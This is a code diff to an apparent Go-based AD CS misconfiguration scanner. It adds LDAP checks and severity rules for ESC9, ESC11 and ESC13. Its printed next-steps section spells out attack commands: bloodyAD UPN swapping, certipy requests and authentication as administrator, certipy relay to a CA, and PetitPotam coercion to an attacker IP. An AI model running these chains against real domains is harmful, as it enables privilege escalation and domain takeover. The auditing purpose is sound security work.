@@ -17,13 +17,16 @@ import (
 type ADCSVulnType string
 
 const (
-	ESC1 ADCSVulnType = "ESC1" // Enrollee supplies subject (SAN injection)
-	ESC2 ADCSVulnType = "ESC2" // Any Purpose / no EKU
-	ESC3 ADCSVulnType = "ESC3" // Certificate Request Agent EKU
-	ESC4 ADCSVulnType = "ESC4" // Low-priv principal has write permissions on template object
-	ESC6 ADCSVulnType = "ESC6" // CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag
-	ESC7 ADCSVulnType = "ESC7" // Low-priv principal has ManageCA / ManageCertificates on CA
-	ESC8 ADCSVulnType = "ESC8" // Web Enrollment endpoint active (NTLM relay possible)
+	ESC1  ADCSVulnType = "ESC1"  // Enrollee supplies subject (SAN injection)
+	ESC2  ADCSVulnType = "ESC2"  // Any Purpose / no EKU
+	ESC3  ADCSVulnType = "ESC3"  // Certificate Request Agent EKU
+	ESC4  ADCSVulnType = "ESC4"  // Low-priv principal has write permissions on template object
+	ESC6  ADCSVulnType = "ESC6"  // CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag
+	ESC7  ADCSVulnType = "ESC7"  // Low-priv principal has ManageCA / ManageCertificates on CA
+	ESC8  ADCSVulnType = "ESC8"  // Web Enrollment endpoint active (NTLM relay possible)
+	ESC9  ADCSVulnType = "ESC9"  // CT_FLAG_NO_SECURITY_EXTENSION — no SID binding in issued cert
+	ESC11 ADCSVulnType = "ESC11" // ICPR/DCOM enrollment interface relay
+	ESC13 ADCSVulnType = "ESC13" // Issuance policy OID linked to privileged group
 )
 
 // msPKI-Certificate-Name-Flag bitmasks
@@ -37,6 +40,7 @@ const (
 	ctFlagIncludeSymmetricAlgorithms = 0x00000001
 	ctFlagPublishToDS                = 0x00000008
 	ctFlagAutoenrollment             = 0x00000020
+	ctFlagNoSecurityExtension        = 0x00080000 // ESC9: omits szOID_NTDS_CA_SECURITY_EXT from issued cert
 )
 
 // CA editFlags bitmask (from msPKI-Enrollment-Servers / flags attribute)
@@ -53,15 +57,18 @@ var lowPrivSIDs = []string{
 }
 
 type CertTemplateFinding struct {
-	TemplateName    string
-	TemplateOID     string
-	CAName          string
-	VulnTypes       []ADCSVulnType
-	EnrollableBy    []string
-	AllowsSANInject bool
-	EKUs            []string
-	AuthEnabled     bool // has Client Auth / Smart Card Logon EKU
-	Severity        string
+	TemplateName      string
+	TemplateOID       string
+	CAName            string
+	VulnTypes         []ADCSVulnType
+	EnrollableBy      []string
+	AllowsSANInject   bool
+	EKUs              []string
+	AuthEnabled       bool // has Client Auth / Smart Card Logon EKU
+	NoSecurityExt     bool // ESC9: cert issued without SID-binding extension
+	IssuancePolicyOID string // ESC13: policy OID linked to group
+	LinkedGroupDN     string // ESC13: privileged group DN
+	Severity          string
 }
 
 type CAFinding struct {
@@ -105,6 +112,7 @@ var certTemplateAttributes = []string{
 	"pKIExtendedKeyUsage",
 	"msPKI-RA-Signature",
 	"msPKI-Cert-Template-OID",
+	"msPKI-Certificate-Policy", // ESC13: issuance policy OID linked to group
 	"nTSecurityDescriptor",
 }
 
@@ -196,6 +204,17 @@ func AnalyzeADCS(client *adldap.Client) (*ADCSResult, error) {
 			Details:   "Verify if Web Enrollment is active: http://" + ca.Server + "/certsrv/ — if accessible and NTLM auth is allowed, PetitPotam/Coercer → certipy relay attack is possible.",
 			Severity:  "High",
 		})
+
+		// ESC11: ICPR/DCOM (legacy RPC certificate enrollment) relay
+		// Similar to ESC8 but via MS-ICPR instead of HTTP. No remote check possible —
+		// flag as informational for manual verification.
+		result.CAFindings = append(result.CAFindings, CAFinding{
+			CAName:    ca.Name,
+			CADN:      ca.DN,
+			VulnTypes: []ADCSVulnType{ESC11},
+			Details:   "Verify if the ICPR (MS-ICPR/DCOM) enrollment interface is accessible: certipy relay -target 'rpc://" + ca.Server + "' — if NTLM relay is possible via DCOM, an attacker can request certificates as a coerced machine account.",
+			Severity:  "High",
+		})
 	}
 
 	// ── 2. Enumerate certificate templates ───────────────────
@@ -223,6 +242,14 @@ func AnalyzeADCS(client *adldap.Client) (*ADCSResult, error) {
 		result.CAFindings = append(result.CAFindings, esc7Findings...)
 	}
 
+	// ── 4. ESC13: Issuance policy OID linked to group ────────
+	tmplIfaces := make([]ldapEntry, len(tmplEntries))
+	for i, e := range tmplEntries {
+		tmplIfaces[i] = e
+	}
+	esc13Findings := checkESC13(client, configDN, tmplIfaces)
+	result.TemplateFindings = append(result.TemplateFindings, esc13Findings...)
+
 	return result, nil
 }
 
@@ -246,12 +273,16 @@ func analyzeTemplate(e ldapEntry) *CertTemplateFinding {
 	nameFlagStr := e.GetAttributeValue("msPKI-Certificate-Name-Flag")
 	nameFlag, _ := strconv.ParseInt(nameFlagStr, 10, 64)
 
+	enrollmentFlagStr := e.GetAttributeValue("msPKI-Enrollment-Flag")
+	enrollmentFlag, _ := strconv.ParseInt(enrollmentFlagStr, 10, 64)
+
 	ekus  := e.GetAttributeValues("pKIExtendedKeyUsage")
 	raSig := e.GetAttributeValue("msPKI-RA-Signature")
 
 	var vulns []ADCSVulnType
-	allowsSAN  := false
-	authEnabled := false
+	allowsSAN      := false
+	authEnabled    := false
+	noSecurityExt  := enrollmentFlag&ctFlagNoSecurityExtension != 0
 
 	// ── ESC1: ENROLLEE_SUPPLIES_SUBJECT bit set ───────────────
 	// Correct bitmask check — value can be e.g. 65536 (0x10000) with bit 0 set
@@ -289,8 +320,16 @@ func analyzeTemplate(e ldapEntry) *CertTemplateFinding {
 		}
 	}
 
+	// ── ESC9: No Security Extension ──────────────────────────
+	// Template omits szOID_NTDS_CA_SECURITY_EXT — issued certs don't bind to an AD SID.
+	// Combined with GenericWrite over a victim account (to change UPN), an attacker can
+	// request a cert that maps to a different account.
+	if noSecurityExt && authEnabled {
+		vulns = appendUniq(vulns, ESC9)
+	}
+
 	// Only flag templates that enable authentication — others are low risk
-	if !authEnabled && !allowsSAN {
+	if !authEnabled && !allowsSAN && !noSecurityExt {
 		return nil
 	}
 	if len(vulns) == 0 {
@@ -311,7 +350,7 @@ func analyzeTemplate(e ldapEntry) *CertTemplateFinding {
 	enrollableBy := checkEnrollmentRights(e)
 
 	// Severity: Critical if ESC1 + auth EKU + low-priv can enroll
-	//           Medium  if ESC1 + auth EKU but no low-priv enrollment (still misconfigured, but not immediately exploitable)
+	//           Medium  if ESC1 + no low-priv enrollment, or ESC9 (requires additional write access)
 	//           High    otherwise
 	sev := "High"
 	if containsVuln(vulns, ESC1) && authEnabled {
@@ -320,6 +359,9 @@ func analyzeTemplate(e ldapEntry) *CertTemplateFinding {
 		} else {
 			sev = "Medium"
 		}
+	} else if containsVuln(vulns, ESC9) && !containsVuln(vulns, ESC1) {
+		// ESC9 alone requires GenericWrite over another account — Medium
+		sev = "Medium"
 	}
 
 	return &CertTemplateFinding{
@@ -328,6 +370,7 @@ func analyzeTemplate(e ldapEntry) *CertTemplateFinding {
 		VulnTypes:       vulns,
 		AllowsSANInject: allowsSAN,
 		AuthEnabled:     authEnabled,
+		NoSecurityExt:   noSecurityExt,
 		EKUs:            ekuDisplay,
 		EnrollableBy:    enrollableBy,
 		Severity:        sev,
@@ -543,6 +586,78 @@ func checkESC7(e ldapEntry) []CAFinding {
 }
 
 // ============================================================
+// ESC13 — Issuance policy OID linked to privileged group
+// ============================================================
+
+// checkESC13 queries the CN=OID container for policy objects that have
+// msDS-OIDToGroupLink set, then matches them against certificate templates
+// that include those policy OIDs in msPKI-Certificate-Policy. If a low-priv
+// principal can enroll in such a template, they effectively gain membership
+// in the linked group when authenticating via that certificate.
+func checkESC13(client *adldap.Client, configDN string, tmplEntries []ldapEntry) []CertTemplateFinding {
+	oidBase := "CN=OID,CN=Public Key Services,CN=Services," + configDN
+
+	oidEntries, err := client.SearchBase(oidBase, "(msDS-OIDToGroupLink=*)", []string{
+		"cn",
+		"msPKI-Cert-Template-OID",
+		"msDS-OIDToGroupLink",
+	})
+	if err != nil {
+		return nil
+	}
+
+	// Build map: policy OID → linked group DN
+	policyToGroup := make(map[string]string)
+	for _, oe := range oidEntries {
+		oid := oe.GetAttributeValue("msPKI-Cert-Template-OID")
+		group := oe.GetAttributeValue("msDS-OIDToGroupLink")
+		if oid != "" && group != "" {
+			policyToGroup[oid] = group
+		}
+	}
+
+	if len(policyToGroup) == 0 {
+		return nil
+	}
+
+	var findings []CertTemplateFinding
+
+	for _, e := range tmplEntries {
+		policies := e.GetAttributeValues("msPKI-Certificate-Policy")
+		for _, pol := range policies {
+			groupDN, linked := policyToGroup[pol]
+			if !linked {
+				continue
+			}
+
+			name := e.GetAttributeValue("cn")
+			if name == "" {
+				name = e.GetAttributeValue("displayName")
+			}
+
+			enrollableBy := checkEnrollmentRights(e)
+			sev := "High"
+			if len(enrollableBy) > 0 {
+				sev = "Critical"
+			}
+
+			findings = append(findings, CertTemplateFinding{
+				TemplateName:      name,
+				TemplateOID:       e.GetAttributeValue("msPKI-Cert-Template-OID"),
+				VulnTypes:         []ADCSVulnType{ESC13},
+				EnrollableBy:      enrollableBy,
+				IssuancePolicyOID: pol,
+				LinkedGroupDN:     groupDN,
+				Severity:          sev,
+			})
+			break // one finding per template
+		}
+	}
+
+	return findings
+}
+
+// ============================================================
 // Helpers
 // ============================================================
 
@@ -704,6 +819,34 @@ func printADCSResult(r *ADCSResult, showNextSteps bool) {
 			color.White("    # Trigger coercion: python3 PetitPotam.py <attacker-ip> %s", cf.CAName)
 			break
 		}
+	}
+
+	if tmpls, ok := vulnSet[ESC9]; ok {
+		tmpl := tmpls[0]
+		color.White("  ESC9  — No Security Extension: requires GenericWrite over a victim account")
+		color.White("    # 1. Change victim UPN to impersonate target")
+		color.White("    bloodyAD -u user -p pass -d %s set object victim userPrincipalName administrator@%s", r.Domain, r.Domain)
+		color.White("    # 2. Request cert as victim (cert will show administrator UPN)")
+		color.White("    certipy req -u 'victim@%s' -p 'pass' -ca '<CA>' -template '%s'", r.Domain, tmpl)
+		color.White("    # 3. Restore victim UPN, auth as administrator")
+		color.White("    certipy auth -pfx administrator.pfx -domain %s -dc-ip <DC>", r.Domain)
+	}
+
+	for _, cf := range r.CAFindings {
+		if containsVuln(cf.VulnTypes, ESC11) {
+			color.White("  ESC11 — ICPR/DCOM relay (manual verify required)")
+			color.White("    certipy relay -target 'rpc://%s' -template 'DomainController'", cf.CAName)
+			color.White("    # Trigger coercion: python3 PetitPotam.py <attacker-ip> %s", cf.CAName)
+			break
+		}
+	}
+
+	if tmpls, ok := vulnSet[ESC13]; ok {
+		tmpl := tmpls[0]
+		color.White("  ESC13 — Issuance policy OID linked to privileged group")
+		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s'", r.Domain, tmpl)
+		color.White("    # Authenticate — group membership applied via OID in cert")
+		color.White("    certipy auth -pfx user.pfx -domain %s -dc-ip <DC>", r.Domain)
 	}
 }
 
